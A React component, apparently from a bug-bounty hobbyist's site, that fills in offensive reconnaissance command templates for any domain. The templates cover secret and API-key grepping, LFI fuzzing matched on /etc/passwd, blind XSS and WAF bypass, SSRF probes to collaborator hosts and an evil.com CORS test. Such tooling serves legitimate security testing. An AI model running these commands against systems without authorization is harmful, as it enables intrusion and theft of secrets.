'use client'

import React, { useState, useCallback } from 'react'

// Define type for commands
type CommandDictionary = {
  [key: string]: string
}

// Store original commands as templates (moved outside component to prevent recreation)
const commandTemplates: CommandDictionary = {
  'subfinder-basic': 'subfinder -d example.com -all -recursive > subdomain.txt',
  'httpx-filter': 'cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt',
  'subzy-check': 'subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl',
  'katana-passive': 'katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt',
  'advanced-urls': 'echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt\nkatana -u https://example.com -d 5 | grep \'=\' | urldedupe | anew output.txt\ncat output.txt | sed \'s/=.*/=/\' >final.txt',
  'gau-urls': 'echo example.com | gau --mc 200 | urldedupe >urls.txt\ncat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep \'=\' | sort > output.txt\ncat output.txt | sed \'s/=.*/=/\' >final.txt',
  'sensitive-files': 'cat allurls.txt | grep -E "\\.xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar\\.gz|\\.tgz|\\.bak|\\.7z|\\.rar|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.gz|\\.config|\\.csv|\\.yaml|\\.md|\\.md5"',
  'info-dork': 'site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)',
  'git-detection': 'echo example.com | gau | grep -E "\\.git" | head -20',
  'info-disclosure': 'echo https://example.com | gau | grep -E "\\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"',
  's3-buckets': 's3scanner scan -d example.com',
  'api-keys': 'cat allurls.txt | grep -E "\\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d\' \' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"',
  'xss-pipeline': 'echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt',
  'dalfox-xss': 'cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence',
  'stored-xss': 'cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high',
  'dom-xss': 'cat js_files.txt | Gxss -c 100 | sort -u | dalfox pipe -o dom_xss_results.txt',
  'lfi-method': 'echo "https://example.com/" | gau | gf lfi | uro | sed \'s/=.*/=/\' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\\*|\\$[^\\:]*):0:0:" -v',
  'cors-check': 'curl -H "Origin: http://example.com" -I https://example.com/wp-json/',
  'corscanner': 'python3 CORScanner.py -u https://example.com -d -t 10',
  'cors-nuclei': 'cat subdomains.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt',
  'cors-reflection': 'curl -H "Origin: https://evil.com" -I https://example.com/api/data | grep -i "access-control-allow-origin: https://evil.com"',
  'naabu': 'naabu -list ip.txt -c 50 -nmap-cli \'nmap -sV -sC\' -o naabu-full.txt',
  'nmap': 'nmap -p- --min-rate 1000 -T4 -A example.com -oA fullscan',
  'masscan': 'masscan -p0-65535 example.com --rate 100000 -oG masscan-results.txt',
  'wpscan': 'wpscan --url https://example.com --disable-tls-checks --api-token YOUR_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force',
  'arjun-passive': `arjun -u https://example.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"`,
  'arjun-wordlist': `arjun -u https://example.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"`,
  'js-hunting': `echo example.com | katana -d 5 | grep -E "\\.js$" | nuclei -t /path/to/nuclei-templates/http/exposures/ -c 30`,
  'js-analysis': `cat alljs.txt | nuclei -t /path/to/nuclei-templates/http/exposures/`,
  'content-check': `echo example.com | gau | grep -Eo '(\\/[^\\/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'`,
  'js-content': `echo example.com | gau | grep '\\.js-php-jsp-other extens$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'`,
  'shodan-ssl': `Ssl.cert.subject.CN:"example.com" 200`,
  'ffuf-lfi': `ffuf -request lfi -request-proto https -w /root/wordlists/offensive\\ payloads/LFI\\ payload.txt -c -mr "root:"`,
  'ffuf-xss': `ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"`,
  'header-testing': `cat example.coms.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\\e[1;32m$url\\e[0m""\\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\\n""Method[3] Host: xss+ssrf ==> $xss3""\\n""Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ""\\n";done`
}

export const BugHuntingToolkit = () => {
  const [domain, setDomain] = useState('example.com')
  const [notification, setNotification] = useState('')
  const [showNotification, setShowNotification] = useState(false)
  const [commands, setCommands] = useState<CommandDictionary>(commandTemplates)

  const updateCommands = useCallback((newDomain: string) => {
    const updatedCommands: CommandDictionary = {}
    for (const [id, template] of Object.entries(commandTemplates)) {
      updatedCommands[id] = template
        .replace(/example\.com/g, newDomain)
        .replace(/site\.com/g, newDomain)
        .replace(/target\.com/g, newDomain)
    }
    setCommands(updatedCommands)
  }, [])

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (domain.trim()) {
      updateCommands(domain.trim())
      showNotificationMessage(`Commands updated for: ${domain}`)
    }
  }

  const copyCommand = async (commandText: string) => {
    try {
      await navigator.clipboard.writeText(commandText)
      showNotificationMessage('Command copied to clipboard!')
    } catch {
      showNotificationMessage('Failed to copy command')
    }
  }

  const showNotificationMessage = (message: string) => {
    setNotification(message)
    setShowNotification(true)
    setTimeout(() => setShowNotification(false), 2000)
  }

  const ToolCard = ({ title, description, commandId, multiline = false }: {
    title: string
    description: string
    commandId: string
    multiline?: boolean
  }) => (
    <div className="projects border border-border rounded-lg p-4 bg-card hover:bg-accent/50 transition-colors">
      <div className="flex items-start justify-between mb-2">
        <h3 className="font-semibold text-lg">{title}</h3>
        <button
          onClick={() => copyCommand(commands[commandId])}
          className="p-2 hover:bg-accent rounded transition-colors"
          aria-label="Copy command"
        >
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
          </svg>
        </button>
      </div>
      <p className="text-sm text-muted-foreground mb-3">{description}</p>
      <div className="bg-muted rounded p-3 font-mono text-sm overflow-x-auto">
        <span className="text-green-400">$ </span>
        <span className={multiline ? "whitespace-pre-line break-words" : "break-all"}>{commands[commandId]}</span>
      </div>
    </div>
  )

  return (
    <div className="w-full">
      {/* Header Section */}
      <div className="text-center mb-8">
        <form onSubmit={handleSubmit} className="flex gap-2 max-w-md mx-auto">
          <input
            type="text"
            value={domain}
            onChange={(e) => setDomain(e.target.value)}
            placeholder="example.com"
            className="flex-1 px-3 py-2 border border-border rounded-md bg-background"
            required
          />
          <button
            type="submit"
            className="px-4 py-2 bg-primary text-primary-foreground rounded-md hover:bg-primary/90 transition-colors"
          >
            Generate
          </button>
        </form>
      </div>

      {/* Notification */}
      {showNotification && (
        <div className="fixed top-4 right-4 bg-primary text-primary-foreground px-4 py-2 rounded-md shadow-lg z-50">
          {notification}
        </div>
      )}

      {/* Subdomain Enumeration */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" />
          </svg>
          Subdomain Enumeration
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Basic Subdomain Discovery"
            description="Discovers subdomains using subfinder with recursive enumeration and saves results to a file."
            commandId="subfinder-basic"
          />
          <ToolCard
            title="Live Subdomain Filtering"
            description="Filters discovered subdomains using httpx and saves the alive ones to a file."
            commandId="httpx-filter"
          />
          <ToolCard
            title="Subdomain Takeover Check"
            description="Checks for subdomain takeover vulnerabilities using subzy."
            commandId="subzy-check"
          />
        </div>
      </section>

      {/* URL Collection */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
          </svg>
          URL Collection
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Passive URL Collection"
            description="Collects URLs from various sources and saves them to a file."
            commandId="katana-passive"
          />
          <ToolCard
            title="Advanced URL Fetching"
            description="Collects URLs from various sources using multiple techniques."
            commandId="advanced-urls"
            multiline
          />
          <ToolCard
            title="GAU URL Collection"
            description="Collects URLs using GAU and saves them to a file."
            commandId="gau-urls"
            multiline
          />
        </div>
      </section>

      {/* Sensitive Data Discovery */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
          </svg>
          Sensitive Data Discovery
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Sensitive File Detection"
            description="Detects sensitive files on the web server."
            commandId="sensitive-files"
          />
          <ToolCard
            title="Information Disclosure Dork"
            description="Searches for information disclosure vulnerabilities using a dork."
            commandId="info-dork"
          />
          <ToolCard
            title="Git Repository Detection"
            description="Detects Git repositories on the web server."
            commandId="git-detection"
          />
          <ToolCard
            title="Information Disclosure"
            description="Searches for Information disclosure vulnerabilities."
            commandId="info-disclosure"
          />
          <ToolCard
            title="S3 Buckets Finder"
            description="Finds S3 Buckets."
            commandId="s3-buckets"
          />
          <ToolCard
            title="API Keys Finder"
            description="Finds API Keys in javascript files."
            commandId="api-keys"
          />
        </div>
      </section>

      {/* XSS Testing */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" />
          </svg>
          XSS Testing
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="XSS Hunting Pipeline"
            description="Collects XSS vulnerabilities using various tools and saves them to a file."
            commandId="xss-pipeline"
          />
          <ToolCard
            title="XSS with Dalfox"
            description="Uses Dalfox to scan for XSS vulnerabilities."
            commandId="dalfox-xss"
          />
          <ToolCard
            title="Stored XSS Finder"
            description="Finds potential stored XSS vulnerabilities by scanning forms."
            commandId="stored-xss"
          />
          <ToolCard
            title="DOM XSS Detection"
            description="Detects potential DOM-based XSS vulnerabilities."
            commandId="dom-xss"
          />
        </div>
      </section>

      {/* LFI Testing */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
          </svg>
          LFI Testing
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="LFI Methodology"
            description="Tests for Local File Inclusion (LFI) vulnerabilities using various methods."
            commandId="lfi-method"
          />
        </div>
      </section>

      {/* CORS Testing */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          CORS Testing
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Basic CORS Check"
            description="Checks the Cross-Origin Resource Sharing (CORS) policy of a website."
            commandId="cors-check"
          />
          <ToolCard
            title="CORScanner"
            description="Fast CORS misconfiguration scanner that helps identify potential CORS vulnerabilities."
            commandId="corscanner"
          />
          <ToolCard
            title="CORS Nuclei Scan"
            description="Uses Nuclei to scan for CORS misconfigurations across multiple domains."
            commandId="cors-nuclei"
          />
          <ToolCard
            title="CORS Origin Reflection Test"
            description="Tests for origin reflection vulnerability in CORS configuration."
            commandId="cors-reflection"
          />
        </div>
      </section>

      {/* Network Scanning */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z" />
          </svg>
          Network Scanning
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Naabu Scan"
            description="Scans for open ports and services using Naabu."
            commandId="naabu"
          />
          <ToolCard
            title="Nmap Full Scan"
            description="Performs a full port scan using Nmap."
            commandId="nmap"
          />
          <ToolCard
            title="Masscan"
            description="Scans for open ports and services using Masscan."
            commandId="masscan"
          />
        </div>
      </section>

      {/* WordPress Scanning */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
          </svg>
          WordPress Scanning
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Aggressive WordPress Scan"
            description="Scans a WordPress website for vulnerabilities and saves the results to a file."
            commandId="wpscan"
          />
        </div>
      </section>

      {/* Parameter Discovery */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
          </svg>
          Parameter Discovery
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Arjun Passive Discovery"
            description="Discovers parameters passively using Arjun."
            commandId="arjun-passive"
          />
          <ToolCard
            title="Arjun Wordlist Discovery"
            description="Discovers parameters using a wordlist with Arjun."
            commandId="arjun-wordlist"
          />
        </div>
      </section>

      {/* JavaScript Analysis */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" />
          </svg>
          JavaScript Analysis
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="JS File Hunting"
            description="Collects JavaScript files from a website and analyzes them."
            commandId="js-hunting"
          />
          <ToolCard
            title="JS File Analysis"
            description="Analyzes collected JavaScript files."
            commandId="js-analysis"
          />
        </div>
      </section>

      {/* Content Type Filtering */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 4a1 1 0 011-1h16a1 1 0 011 1v2.586a1 1 0 01-.293.707l-6.414 6.414a1 1 0 00-.293.707V17l-4 4v-6.586a1 1 0 00-.293-.707L3.293 7.293A1 1 0 013 6.586V4z" />
          </svg>
          Content Type Filtering
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="Content Type Check"
            description="Checks the content type of URLs."
            commandId="content-check"
          />
          <ToolCard
            title="JavaScript Content Check"
            description="Checks for JavaScript content in URLs."
            commandId="js-content"
          />
        </div>
      </section>

      {/* Shodan Dorks */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
          </svg>
          Shodan Dorks
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="SSL Certificate Search"
            description="Searches for SSL certificates using Shodan."
            commandId="shodan-ssl"
          />
        </div>
      </section>

      {/* FFUF Request File Method */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
          </svg>
          FFUF Request File Method
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="LFI with Request File"
            description="Uses FFUF to bruteforce LFI vulnerabilities using a request file."
            commandId="ffuf-lfi"
          />
          <ToolCard
            title="XSS with Request File"
            description="Uses FFUF to bruteforce XSS vulnerabilities using a request file."
            commandId="ffuf-xss"
          />
        </div>
      </section>

      {/* Advanced Techniques */}
      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
          </svg>
          Advanced Techniques
        </h2>
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          <ToolCard
            title="XSS/SSRF Header Testing"
            description="Tests for XSS and SSRF vulnerabilities using various methods."
            commandId="header-testing"
          />
        </div>
      </section>

    </div>
  )
}
/**
 * This code defines a bug hunting toolkit with various tools and techniques.
 */
export default BugHuntingToolkit
